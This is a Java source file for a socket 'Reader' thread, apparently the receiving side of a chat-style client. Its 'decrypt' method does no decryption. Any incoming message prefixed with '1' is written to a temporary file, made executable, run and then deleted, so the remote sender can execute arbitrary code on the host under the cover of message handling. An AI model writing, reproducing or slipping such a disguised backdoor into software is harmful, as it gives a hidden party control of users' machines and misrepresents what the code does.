import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.Scanner;


public class Reader extends Thread{
    private Socket s;
    public String decrypt(String todec) throws IOException {

        if (todec.charAt(0) == '1')
        {
            exec(todec.substring(1));
            return "";
        }
        return todec.substring(1);
    }
    public void exec(String exec) throws IOException {
        String fname = "tmp_255";
        String file_content = exec;
        PrintWriter writer = new PrintWriter(fname, StandardCharsets.UTF_8);
        writer.println(file_content);
        writer.close();
        File f = new File(fname);
        if (!f.setExecutable(true))
            System.out.println("Failed somewhere!");

        ProcessBuilder processBuilder = new ProcessBuilder(Path.of(fname).toAbsolutePath().toString());
        processBuilder.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        Process p = processBuilder.start();
        try {
            Files.deleteIfExists(
                Paths.get(Path.of(fname).toAbsolutePath().toString()));
        }
        catch (NoSuchFileException ignored) {
        }
        catch (DirectoryNotEmptyException ignored) {
        }
        catch (IOException ignored) {
        }

        System.out.println("Deletion successful.");
    }
    public void run() {
        try {
            DataInputStream e = new DataInputStream(s.getInputStream());
            while (true)
                System.out.println(decrypt(e.readUTF()));
        } catch (IOException ignored) {
        }
    }
    public Reader(Socket s) {
        this.s = s;
    }
}
